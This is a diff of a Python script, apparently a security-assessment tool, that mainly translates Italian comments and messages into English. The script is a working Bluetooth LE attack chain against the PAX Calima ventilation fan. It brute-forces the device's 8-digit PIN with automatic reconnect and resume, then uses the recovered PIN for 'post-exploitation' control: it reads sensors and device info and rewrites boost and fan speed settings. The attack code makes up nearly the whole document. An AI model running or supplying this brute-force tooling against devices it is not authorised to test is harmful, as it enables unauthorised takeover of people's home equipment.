@@ -4,8 +4,8 @@
 ║        PAX CALIMA — FULL ATTACK CHAIN (Security Assessment)          ║
 ╠══════════════════════════════════════════════════════════════════════╣
 ║                                                                      ║
-║  Fase 1: Brute-force attack on the BLE PIN (uint32 LE, 8 digits)     ║
-║  Fase 2: Full control of the device (post-exploitation)              ║
+║  Phase 1: Brute-force attack on the BLE PIN (uint32 LE, 8 digits)   ║
+║  Phase 2: Full control of the device (post-exploitation)             ║
 ║                                                                      ║
 ╚══════════════════════════════════════════════════════════════════════╝
 """
@@ -22,7 +22,7 @@ from bleak import BleakClient, BleakScanner, BleakError
 
 TARGET = "XX:XX:XX:XX:XX:XX"  # ← Replace with your PAX Calima BLE MAC address
 
-# UUID Caratteristiche BLE (da reverse engineering pycalima)
+# BLE GATT Characteristic UUIDs (sourced from pycalima reverse engineering)
 CHAR_PIN_CODE = "4cad343a-209a-40b7-b911-4d9b3df569b2"
 CHAR_PIN_CONFIRMATION = "d1ae6b70-ee12-4f6d-b166-d2063dcaffe1"
 CHAR_SENSOR_DATA = "528b80e8-c47a-4c0a-bdf1-916a7748f412"
@@ -36,7 +36,7 @@ CHAR_FIRMWARE_REV = "00002a26-0000-1000-8000-00805f9b34fb"
 CHAR_HARDWARE_REV = "00002a27-0000-1000-8000-00805f9b34fb"
 CHAR_SOFTWARE_REV = "00002a28-0000-1000-8000-00805f9b34fb"
 
-# Parametri brute-force
+# Brute-force parameters
 PIN_MIN = 0
 PIN_MAX = 99999999
 PROGRESS_INTERVAL = 100
@@ -47,16 +47,16 @@ MAX_RECONNECT_ATTEMPTS = 10
 
 
 # ═══════════════════════════════════════════════════════════════════════
-# FASE 1: BRUTE-FORCE
+# PHASE 1: BRUTE-FORCE
 # ═══════════════════════════════════════════════════════════════════════
 
 async def try_pin(client, pin_int):
     """
-    Prova un singolo PIN sul dispositivo.
-    Invia il PIN come uint32 little-endian e legge la conferma.
-    
+    Tries a single PIN against the device.
+    Sends the PIN as a uint32 little-endian value and reads back the confirmation.
+
     Returns:
-        True se il PIN è corretto (confirmation != 0), False altrimenti.
+        True if the PIN is correct (confirmation != 0), False otherwise.
     """
     pin_bytes = struct.pack("<I", pin_int)
     await client.write_gatt_char(CHAR_PIN_CODE, pin_bytes)
@@ -66,8 +66,8 @@ async def try_pin(client, pin_int):
 
 async def connect_with_retry(max_attempts=MAX_RECONNECT_ATTEMPTS):
     """
-    Connessione al dispositivo BLE con meccanismo di retry.
-    Gestisce disconnessioni tipiche dei dispositivi BLE a basso costo.
+    Connects to the BLE device with a retry mechanism.
+    Handles disconnections typical of low-cost BLE devices.
     """
     for attempt in range(1, max_attempts + 1):
         try:
@@ -80,74 +80,74 @@ async def connect_with_retry(max_attempts=MAX_RECONNECT_ATTEMPTS):
         except (BleakError, asyncio.TimeoutError, OSError) as e:
             print(f"  ⚠ Connection failed: {e}")
             if attempt < max_attempts:
-                print(f" Waiting {RECONNECT_DELAY} seconds before retrying...")
+                print(f"  Waiting {RECONNECT_DELAY} seconds before retrying...")
                 await asyncio.sleep(RECONNECT_DELAY)
     return None
 
 
 def format_time(seconds):
-    """Formatta secondi in formato leggibile (s/min/ore/giorni)."""
+    """Formats seconds into a human-readable string (s / min / hours / days)."""
     if seconds < 60:
         return f"{seconds:.1f}s"
     elif seconds < 3600:
         return f"{seconds/60:.1f} min"
     elif seconds < 86400:
-        return f"{seconds/3600:.1f} ore"
+        return f"{seconds/3600:.1f} hours"
     else:
-        return f"{seconds/86400:.1f} giorni"
+        return f"{seconds/86400:.1f} days"
 
 
 def format_pin(pin_int):
-    """Formatta il PIN come stringa a 8 cifre con zero-padding."""
+    """Formats the PIN as a zero-padded 8-digit string."""
     return f"{pin_int:08d}"
 
 
 async def brute_force(start_offset=0):
     """
-    Fase 1: Brute-force del PIN.
-    Prova sequenzialmente tutti i PIN da start_offset a 99999999.
-    
+    Phase 1: PIN brute-force.
+    Sequentially tries all PINs from start_offset up to 99999999.
+
     Returns:
-        Il PIN trovato (int) oppure None se non trovato.
+        The discovered PIN (int) or None if not found.
     """
     print("\n" + "═" * 62)
     print("║  PHASE 1: BRUTE-FORCE PIN                                    ║")
     print("═" * 62)
-    print(f"  Target:  {TARGET}")
-    print(f"  Range:   {format_pin(start_offset)} → {format_pin(PIN_MAX)}")
-    print(f"  PIN to try: {PIN_MAX - start_offset + 1:,}")
+    print(f"  Target:      {TARGET}")
+    print(f"  Range:       {format_pin(start_offset)} → {format_pin(PIN_MAX)}")
+    print(f"  PINs to try: {PIN_MAX - start_offset + 1:,}")
     print("═" * 62)
 
-    # Connessione iniziale
-    print("\n Connecting to the device...")
+    # Initial connection
+    print("\n  Connecting to device...")
     client = await connect_with_retry()
     if not client:
-        print("Unable to connect. Logging out.")
+        print("  Unable to connect. Aborting.")
         return None
 
-    # Statistiche
+    # Statistics
     total_attempts = 0
     start_time = time.time()
     pin_found = None
     current_pin = start_offset
 
-    print(f"\n🔓 Start a brute-force attack from PIN {format_pin(start_offset)}...")
-    print(f"   Progress every {PROGRESS_INTERVAL} attempts\n")
+    print(f"\n🔓 Starting brute-force attack from PIN {format_pin(start_offset)}...")
+    print(f"   Progress reported every {PROGRESS_INTERVAL} attempts\n")
 
     try:
         while current_pin <= PIN_MAX:
-            # Verifica connessione
+            # Check connection
             if not client.is_connected:
-                print(f"\n  Logged out! Last PIN: {format_pin(current_pin - 1)}")
-                print(f"  Reconnection...")
+                print(f"\n  Disconnected! Last PIN tried: {format_pin(current_pin - 1)}")
+                print(f"  Attempting reconnection...")
                 await asyncio.sleep(RECONNECT_DELAY)
                 client = await connect_with_retry()
                 if not client:
-                    print(f"\nReconnection failed. Resume from offset {current_pin}")
+                    print(f"\n  Reconnection failed. Resume from offset {current_pin}")
                     break
-                print(f" Resuming from PIN {format_pin(current_pin)}\n")
+                print(f"  Resuming from PIN {format_pin(current_pin)}\n")
 
-            # Tentativo PIN
+            # PIN attempt
             try:
                 success = await try_pin(client, current_pin)
                 total_attempts += 1
@@ -155,15 +155,14 @@ async def brute_force(start_offset=0):
                 if success:
                     elapsed = time.time() - start_time
                     pin_found = current_pin
-                    #print("\n" + "🎉" * 20)
                     print(f"\n  ✅ PIN FOUND: {format_pin(pin_found)}")
-                    print(f"  Time: {format_time(elapsed)}")
-                    print(f"  Attempts: {total_attempts:,}")
-                    print(f"  Speed: {total_attempts/elapsed:.1f} trials/s")
+                    print(f"  Time elapsed: {format_time(elapsed)}")
+                    print(f"  Total attempts: {total_attempts:,}")
+                    print(f"  Speed: {total_attempts/elapsed:.1f} attempts/s")
                     print("\n" + "🎉" * 20)
                     break
 
-                # Stampa progresso
+                # Print progress
                 if total_attempts % PROGRESS_INTERVAL == 0:
                     elapsed = time.time() - start_time
                     rate = total_attempts / elapsed if elapsed > 0 else 0
@@ -179,7 +178,7 @@ async def brute_force(start_offset=0):
                     await asyncio.sleep(ATTEMPT_DELAY)
 
             except (BleakError, asyncio.TimeoutError, OSError) as e:
-                print(f"\n  BLE error PIN {format_pin(current_pin)}: {e}")
+                print(f"\n  BLE error at PIN {format_pin(current_pin)}: {e}")
                 try:
                     await client.disconnect()
                 except Exception:
@@ -189,9 +188,9 @@ async def brute_force(start_offset=0):
 
     except KeyboardInterrupt:
         elapsed = time.time() - start_time
-        print(f"\n\n Interrupted! Last PIN:: {format_pin(current_pin)}")
-        print(f"  To resume, use the offset: {current_pin}")
-        print(f"  Attempts: {total_attempts:,} | Tempo: {format_time(elapsed)}")
+        print(f"\n\n  Interrupted! Last PIN tried: {format_pin(current_pin)}")
+        print(f"  To resume, use offset: {current_pin}")
+        print(f"  Attempts: {total_attempts:,} | Time: {format_time(elapsed)}")
 
     finally:
         try:
@@ -201,36 +200,36 @@ async def brute_force(start_offset=0):
         except Exception:
             pass
 
-    # Riepilogo
+    # Summary
     elapsed = time.time() - start_time
     print("\n" + "─" * 62)
     print("  BRUTE-FORCE SUMMARY")
     print("─" * 62)
-    print(f"  PIN found:      {'YES → ' + format_pin(pin_found) if pin_found is not None else 'NO'}")
-    print(f"  Total attempts: {total_attempts:,}")
-    print(f"  Total time:     {format_time(elapsed)}")
+    print(f"  PIN found:       {'YES → ' + format_pin(pin_found) if pin_found is not None else 'NO'}")
+    print(f"  Total attempts:  {total_attempts:,}")
+    print(f"  Total time:      {format_time(elapsed)}")
     if total_attempts > 0 and elapsed > 0:
         rate = total_attempts / elapsed
-        print(f"  Average speed:   {rate:.1f} tentativi/s")
-        print(f"  Estimated time for a full brute-force attack: {format_time((PIN_MAX + 1) / rate)}")
+        print(f"  Average speed:   {rate:.1f} attempts/s")
+        print(f"  Estimated time for a full brute-force: {format_time((PIN_MAX + 1) / rate)}")
     print("─" * 62)
 
     return pin_found
 
 
 # ═══════════════════════════════════════════════════════════════════════
-# FASE 2: POST-EXPLOITATION (CONTROLLO REMOTO)
+# PHASE 2: POST-EXPLOITATION (REMOTE CONTROL)
 # ═══════════════════════════════════════════════════════════════════════
 
 def parse_sensor_data(data):
     """
-    Decodifica i 12 byte dei sensori PAX Calima.
-    Formato struct: '<4HBHB'
-      - Humidity (raw) → log2(val) * 10 = percentuale
+    Decodes the 12 bytes of PAX Calima sensor data.
+    Struct format: '<4HBHB'
+      - Humidity (raw) → log2(val) * 10 = percentage
       - Temperature (raw) → val / 4 = °C
       - Light (lux)
       - Fan speed (RPM)
-      - Mode byte (trigger attivo)
+      - Mode byte (active trigger)
       - Extra short
       - Extra byte
     """
@@ -251,14 +250,14 @@ def parse_sensor_data(data):
     temperature = temp_raw / 4.0
 
     mode_names = {
-        0x00: "Spento / Inattivo",
-        0x01: "Umidità",
-        0x02: "Luce",
-        0x03: "Boost (manuale)",
+        0x00: "Off / Idle",
+        0x01: "Humidity",
+        0x02: "Light",
+        0x03: "Boost (manual)",
         0x04: "Timer",
-        0xcb: "Attivo (combinato)",
+        0xcb: "Active (combined)",
     }
-    mode_str = mode_names.get(mode_byte, f"Sconosciuto (0x{mode_byte:02x})")
+    mode_str = mode_names.get(mode_byte, f"Unknown (0x{mode_byte:02x})")
 
     return {
         "humidity_raw": humidity_raw, "humidity": humidity,
@@ -270,20 +269,20 @@ def parse_sensor_data(data):
 
 
 def print_sensor_info(parsed):
-    """Stampa formattata stato sensori."""
+    """Prints a formatted summary of the sensor status."""
     print("\n╔══════════════════════════════════════╗")
-    print("║       STATUS OF CALIMA PAX SENSORS     ║")
+    print("║       PAX CALIMA — SENSOR STATUS       ║")
     print("╠══════════════════════════════════════╣")
     print(f"║  Temperature: {parsed['temperature']:.1f}°C")
-    print(f"║  Humidity:     {parsed['humidity']:.1f}%")
-    print(f"║  Light:        {parsed['light']} lux")
-    print(f"║  Fan:     {parsed['fan_speed']} RPM")
+    print(f"║  Humidity:    {parsed['humidity']:.1f}%")
+    print(f"║  Light:       {parsed['light']} lux")
+    print(f"║  Fan:         {parsed['fan_speed']} RPM")
     print(f"║  Mode:        {parsed['mode_str']}")
     print("╚══════════════════════════════════════╝")
 
 
 async def read_sensor_status(client):
-    """Legge e visualizza dati sensori."""
+    """Reads and displays sensor data from the device."""
     data = await client.read_gatt_char(CHAR_SENSOR_DATA)
     print(f"\n  Raw ({len(data)} bytes): {data.hex()}")
     parsed = parse_sensor_data(data)
@@ -293,7 +292,7 @@ async def read_sensor_status(client):
 
 
 async def read_fan_speed_settings(client):
-    """Legge velocità ventola."""
+    """Reads the current fan speed settings."""
     try:
         data = await client.read_gatt_char(CHAR_FAN_SPEED)
         print(f"\n  Fan speed data ({len(data)} bytes): {data.hex()}")
@@ -306,11 +305,11 @@ async def read_fan_speed_settings(client):
 
 
 async def activate_boost(client):
-    """Attiva boost mode con velocità e durata personalizzate."""
+    """Activates boost mode with a custom speed and duration."""
     print("\n--- BOOST ACTIVATION ---")
     try:
-        speed = int(input("  Speed (RPM, es. 2400): ") or "2400")
-        seconds = int(input("  Duration (seconds, es. 300): ") or "300")
+        speed = int(input("  Speed (RPM, e.g. 2400): ") or "2400")
+        seconds = int(input("  Duration (seconds, e.g. 300): ") or "300")
     except ValueError:
         speed, seconds = 2400, 300
 
@@ -318,49 +317,49 @@ async def activate_boost(client):
     print(f"  Payload: {payload.hex()}")
     try:
         await client.write_gatt_char(CHAR_BOOST, payload)
-        print(f"  Boost activated: {speed} RPM per {seconds}s")
+        print(f"  Boost activated: {speed} RPM for {seconds}s")
     except Exception as e:
         print(f"  Error: {e}")
 
 
 async def deactivate_boost(client):
-    """Disattiva boost mode."""
+    """Deactivates boost mode."""
     payload = struct.pack("<BHH", 0, 0, 0)
     try:
         await client.write_gatt_char(CHAR_BOOST, payload)
-        print(" Boost deactivate")
+        print("  Boost deactivated.")
     except Exception as e:
         print(f"  ❌ Error: {e}")
 
 
 async def set_fan_speed_levels(client):
-    """Imposta soglie di velocità per umidità."""
-    print("\n--- SPEED SETTING ---")
+    """Sets the humidity-based speed thresholds."""
+    print("\n--- SPEED SETTINGS ---")
     try:
         threshold = int(input("  Humidity threshold (%): ") or "75")
         high = int(input("  HIGH speed (RPM): ") or "2400")
-        medium = int(input("  AVERAGE speed (RPM): ") or "1600")
+        medium = int(input("  MEDIUM speed (RPM): ") or "1600")
         low = int(input("  LOW speed (RPM): ") or "800")
     except ValueError:
-        print("  Invalid values")
+        print("  Invalid values.")
         return
 
     payload = struct.pack("<4H", threshold, high, medium, low)
     try:
         await client.write_gatt_char(CHAR_SENSITIVITY, payload)
-        print("  Set speeds")
+        print("  Speed levels set successfully.")
     except Exception as e:
         print(f"  Error: {e}")
 
 
 async def read_sensitivity(client):
-    """Legge impostazioni sensibilità."""
+    """Reads the current sensitivity / speed threshold settings."""
     try:
         data = await client.read_gatt_char(CHAR_SENSITIVITY)
         if len(data) >= 8:
             v = struct.unpack('<4H', data[:8])
             print(f"\n  Humidity threshold: {v[0]}%")
-            print(f"  High: {v[1]} RPM | Average: {v[2]} RPM | Low: {v[3]} RPM")
+            print(f"  High: {v[1]} RPM | Medium: {v[2]} RPM | Low: {v[3]} RPM")
         return data
     except Exception as e:
         print(f"  Error: {e}")
@@ -368,7 +367,7 @@ async def read_sensitivity(client):
 
 
 async def read_mode(client):
-    """Legge modalità operativa."""
+    """Reads the current operating mode."""
     try:
         data = await client.read_gatt_char(CHAR_MODE)
         print(f"\n  Mode ({len(data)} bytes): {data.hex()}")
@@ -379,9 +378,9 @@ async def read_mode(client):
 
 
 async def read_device_info(client):
-    """Legge info dispositivo dal servizio 0x180A."""
+    """Reads device information from the Device Information Service (0x180A)."""
     print("\n╔══════════════════════════════════════╗")
-    print("║      DEVICE INFORMATION              ║")
+    print("║         DEVICE INFORMATION           ║")
     print("╠══════════════════════════════════════╣")
     for uuid, name in [
         (CHAR_MANUFACTURER, "Vendor"),
@@ -403,12 +402,12 @@ async def read_device_info(client):
 
 
 async def read_boost_status(client):
-    """Legge stato boost attuale."""
+    """Reads the current boost status."""
     try:
         data = await client.read_gatt_char(CHAR_BOOST)
         if len(data) >= 5:
             v = struct.unpack('<BHH', data[:5])
-            print(f"\n  Boost: {'ATTIVO' if v[0] else 'SPENTO'}")
+            print(f"\n  Boost: {'ACTIVE' if v[0] else 'OFF'}")
             print(f"  Speed: {v[1]} RPM | Remaining time: {v[2]}s")
         return data
     except Exception as e:
@@ -417,7 +416,7 @@ async def read_boost_status(client):
 
 
 def print_menu():
-    """Menu interattivo post-exploitation."""
+    """Prints the interactive post-exploitation control menu."""
     print("\n┌─────────────────────────────────────┐")
     print("│    CALIMA CONTROL MENU               │")
     print("├──────────────────────────────────────┤")
@@ -427,17 +426,17 @@ def print_menu():
     print("│  4) Set speed levels                 │")
     #print("│  5) Read sensitivity settings        │")
     print("│  5) Read boost status                │")
-    #print("│  7) Read the operating procedures    │")
-    print("│  6) Info device                      │")
-    #print("│  7) Fan speed readings               │")
-    print("│  0) Log out and exit                 │")
+    #print("│  7) Read operating mode              │")
+    print("│  6) Device info                      │")
+    #print("│  7) Read fan speed settings          │")
+    print("│  0) Disconnect and exit              │")
     print("└──────────────────────────────────────┘")
 
 
 async def post_exploitation(pin_code):
     """
-    Fase 2: Connessione autenticata e controllo interattivo.
-    Usa il PIN scoperto in Fase 1 per autenticarsi e controllare il dispositivo.
+    Phase 2: Authenticated connection and interactive control.
+    Uses the PIN discovered in Phase 1 to authenticate and control the device.
     """
     print("\n" + "═" * 62)
     print("║  PHASE 2: POST-EXPLOITATION (REMOTE CONTROL)                ║")
@@ -446,16 +445,16 @@ async def post_exploitation(pin_code):
     print(f"  PIN:    {format_pin(pin_code)}")
     print("═" * 62)
 
-    print("\n Connection for post-exploitation...")
+    print("\n  Connecting for post-exploitation...")
 
     async with BleakClient(TARGET, timeout=CONNECTION_TIMEOUT) as client:
         print("  Connected!")
-        print(f"  Services: {len(client.services.services)}")
+        print(f"  Services discovered: {len(client.services.services)}")
 
-        # Autenticazione con PIN trovato
+        # Authenticate with the discovered PIN
         print("\n--- AUTHENTICATION ---")
         pin_bytes = struct.pack("<I", pin_code)
-        print(f"  Send PIN: {format_pin(pin_code)} → {pin_bytes.hex()}")
+        print(f"  Sending PIN: {format_pin(pin_code)} → {pin_bytes.hex()}")
         await client.write_gatt_char(CHAR_PIN_CODE, pin_bytes)
 
         confirmation = await client.read_gatt_char(CHAR_PIN_CONFIRMATION)
@@ -465,7 +464,7 @@ async def post_exploitation(pin_code):
             print("  Authentication failed.")
             return
 
-        # Menu interattivo
+        # Interactive control menu
         while True:
             print_menu()
             try:
@@ -493,22 +492,22 @@ async def post_exploitation(pin_code):
             #elif choice == "7":
                 #await read_fan_speed_settings(client)
             elif choice == "0":
-                print("\n  Log out...")
+                print("\n  Disconnecting...")
                 break
             else:
                 print("  Invalid choice.")
 
-    print("\n Offline. Assessment completed.")
+    print("\n  Offline. Assessment completed.")
 
 
 # ═══════════════════════════════════════════════════════════════════════
-# MAIN — ORCHESTRAZIONE ATTACK CHAIN
+# MAIN — ATTACK CHAIN ORCHESTRATION
 # ═══════════════════════════════════════════════════════════════════════
 
 async def main():
     """
-    Entry point principale.
-    Orchestrazione completa: Brute-Force → Post-Exploitation.
+    Main entry point.
+    Orchestrates the full attack chain: Brute-Force → Post-Exploitation.
     """
     print("\n╔══════════════════════════════════════════════════════════════╗")
     print("║     PAX CALIMA — FULL BLE ATTACK CHAIN                      ║")
@@ -520,8 +519,8 @@ async def main():
 
     print("\n  Select mode:")
     print("  [1] Full attack chain (brute-force + remote control)")
-    print("  [2] Only brute-force")
-    print("  [3] Only remote control (known PIN)")
+    print("  [2] Brute-force only")
+    print("  [3] Remote control only (known PIN)")
 
     try:
         mode = input("\n  Mode [1]: ").strip() or "1"
@@ -530,9 +529,9 @@ async def main():
         return
 
     if mode == "1":
-        # FULL CHAIN: brute-force poi controllo
+        # FULL CHAIN: brute-force then remote control
         try:
-            offset_input = input("  Initial offset brute-force [0]: ").strip() or "0"
+            offset_input = input("  Brute-force start offset [0]: ").strip() or "0"
             start_offset = int(offset_input)
         except (ValueError, EOFError, KeyboardInterrupt):
             start_offset = 0
@@ -549,12 +548,12 @@ async def main():
             if proceed != "n":
                 await post_exploitation(pin_found)
         else:
-            print("\n  PIN not found. Attack chain interrupted.")
+            print("\n  PIN not found. Attack chain aborted.")
 
     elif mode == "2":
-        # SOLO BRUTE-FORCE
+        # BRUTE-FORCE ONLY
         try:
-            offset_input = input(" Initial Offset [0]: ").strip() or "0"
+            offset_input = input("  Start offset [0]: ").strip() or "0"
             start_offset = int(offset_input)
         except (ValueError, EOFError, KeyboardInterrupt):
             start_offset = 0
@@ -562,9 +561,9 @@ async def main():
         await brute_force(start_offset)
 
     elif mode == "3":
-        # SOLO CONTROLLO CON PIN NOTO
+        # REMOTE CONTROL WITH KNOWN PIN
         try:
-            pin_input = input("  Enter your PIN (8 digits): ").strip()
+            pin_input = input("  Enter PIN (8 digits): ").strip()
             pin_code = int(pin_input)
         except (ValueError, EOFError, KeyboardInterrupt):
             print("  Invalid PIN.")
